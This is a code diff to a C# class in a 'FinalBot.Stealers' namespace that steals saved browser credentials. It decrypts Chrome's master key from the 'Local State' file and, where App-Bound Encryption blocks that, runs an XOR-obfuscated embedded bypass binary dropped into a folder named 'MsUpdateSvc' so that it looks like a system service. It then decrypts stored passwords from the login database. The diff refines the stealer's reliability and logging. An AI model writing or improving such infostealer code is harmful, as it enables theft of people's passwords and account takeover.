@@ -97,14 +97,17 @@ namespace FinalBot.Stealers
         private byte[] GetMasterKey(string rootPath)
         {
             string stateFile = Path.Combine(rootPath, "Local State");
-            if (!File.Exists(stateFile)) return null;
+            if (!File.Exists(stateFile)) 
+            {
+                Logger.Warn($"[Stealer] Local State not found: {stateFile}");
+                return null;
+            }
 
+            string tempState = GetRandomTempPath();
             try 
             {
-                string tempState = Path.GetTempFileName();
                 CopyFileWithRetry(stateFile, tempState);
                 string content = File.ReadAllText(tempState);
-                File.Delete(tempState);
                 
                 var json = JObject.Parse(content);
                 string encryptedKey = json["os_crypt"]?["encrypted_key"]?.ToString();
@@ -115,20 +118,25 @@ namespace FinalBot.Stealers
 
                 try 
                 {
-                    // Attempt standard DPAPI unprotect
                     return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
                 }
                 catch (CryptographicException)
                 {
-                    // ABE (App-Bound Encryption) trigger for Chrome 124+
-                    Logger.Warn("App-Bound Encryption detected. Attempting Chromelevator bypass...");
+                    Logger.Warn($"[ABE] App-Bound Encryption detected in {rootPath}. Attempting bypass...");
                     return RunChromelevator(rootPath);
                 }
             }
             catch (Exception ex)
             { 
-                Logger.Error("Failed to parse Local State", ex);
+                Logger.Error($"[Stealer] Failed to parse Local State for {rootPath}", ex);
                 return null; 
+            }
+            finally
+            {
+                if (File.Exists(tempState)) 
+                {
+                    try { File.Delete(tempState); } catch { }
+                }
             }
         }
 
@@ -136,7 +144,6 @@ namespace FinalBot.Stealers
         {
             try
             {
-                // Extract chromelevator.exe from embedded resources on first run
                 string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                 if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
 
@@ -146,22 +153,17 @@ namespace FinalBot.Stealers
                 {
                     var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                     using Stream stream = assembly.GetManifestResourceStream("FinalBot.chromelevator.bin");
-                    if (stream == null)
-                    {
-                        Logger.Warn("[ABE] chromelevator.bin resource not found in assembly.");
-                        return null;
-                    }
+                    if (stream == null) return null;
+                    
                     using MemoryStream ms = new MemoryStream();
                     stream.CopyTo(ms);
                     byte[] bytes = ms.ToArray();
                     for(int i = 0; i < bytes.Length; i++) bytes[i] ^= 0xAA;
                     File.WriteAllBytes(elevatorPath, bytes);
-                    // Make it look like a system file
-                    File.SetAttributes(elevatorPath, FileAttributes.Hidden | FileAttributes.System);
-                    Logger.Info("[ABE] chromelevator extracted to TEMP.");
                 }
 
-                // Run it against the target Chrome profile and capture the decoded key (Base64)
+                // For Edge, we might need a specific argument or it might work with just the path
+                // Most modern "chromelevators" detect the browser type from the path.
                 var proc = new System.Diagnostics.Process
                 {
                     StartInfo = new System.Diagnostics.ProcessStartInfo
@@ -175,29 +177,29 @@ namespace FinalBot.Stealers
                 };
                 proc.Start();
                 string output = proc.StandardOutput.ReadToEnd().Trim();
-                proc.WaitForExit(10_000); // 10 sec timeout
+                proc.WaitForExit(10_000);
 
                 if (!string.IsNullOrEmpty(output))
                 {
-                    Logger.Info("[ABE] chromelevator returned key successfully.");
-                    // Regex helps to find the base64 string even if there's surrounding text
-                    var match = Regex.Match(output, @"[A-Za-z0-9+/]{40,}={0,2}");
+                    var match = Regex.Match(output, @"[A-Za-z0-9+/]{30,}={0,2}");
                     if (match.Success)
                     {
+                        Logger.Info($"[ABE] Bypass successful for {profilePath}");
                         return Convert.FromBase64String(match.Value);
                     }
                 }
+                Logger.Warn($"[ABE] Bypass failed for {profilePath}. Output: {output}");
             }
             catch (Exception ex)
             {
-                Logger.Error("[ABE] chromelevator execution failed", ex);
+                Logger.Error($"[ABE] Bypass execution failed for {profilePath}", ex);
             }
             return null;
         }
 
         private async Task<int> StealPasswords(string dbPath, byte[] masterKey, StringBuilder report)
         {
-            string tempDb = Path.GetTempFileName();
+            string tempDb = GetRandomTempPath();
             CopyFileWithRetry(dbPath, tempDb);
 
             int count = 0;
@@ -213,25 +215,30 @@ namespace FinalBot.Stealers
                     {
                         while (await reader.ReadAsync())
                         {
-                            string url = reader.GetString(0);
-                            string user = reader.GetString(1);
+                            string url = reader.IsDBNull(0) ? "" : reader.GetString(0);
+                            string user = reader.IsDBNull(1) ? "" : reader.GetString(1);
+                            if (reader.IsDBNull(2)) continue;
                             byte[] encryptedPass = (byte[])reader.GetValue(2);
 
                             if (string.IsNullOrEmpty(user) || encryptedPass.Length == 0) continue;
 
                             string pass = DecryptData(encryptedPass, masterKey);
-                            if (!string.IsNullOrEmpty(pass))
-                            {
-                                // In a real stealer, we'd write this to a file for ZIP
-                                // For the text report, we just count
-                                count++;
-                            }
+                            if (!string.IsNullOrEmpty(pass)) count++;
                         }
                     }
                 }
             }
-            catch { }
-            finally { File.Delete(tempDb); }
+            catch (Exception ex)
+            {
+                Logger.Error($"[Stealer] Failed to harvest passwords from {dbPath}", ex);
+            }
+            finally 
+            { 
+                if (File.Exists(tempDb)) 
+                {
+                    try { File.Delete(tempDb); } catch { }
+                }
+            }
 
             return count;
         }
@@ -263,6 +270,11 @@ namespace FinalBot.Stealers
             catch { return null; }
         }
 
+        private string GetRandomTempPath()
+        {
+            return Path.Combine(Path.GetTempPath(), "tmp" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".db");
+        }
+
         private void CopyFileWithRetry(string source, string dest)
         {
             for (int i = 0; i < 5; i++)
@@ -281,7 +293,7 @@ namespace FinalBot.Stealers
                     Thread.Sleep(500);
                 }
             }
-            File.Copy(source, dest, true); // Last resort
+            try { File.Copy(source, dest, true); } catch { }
         }
     }
 }
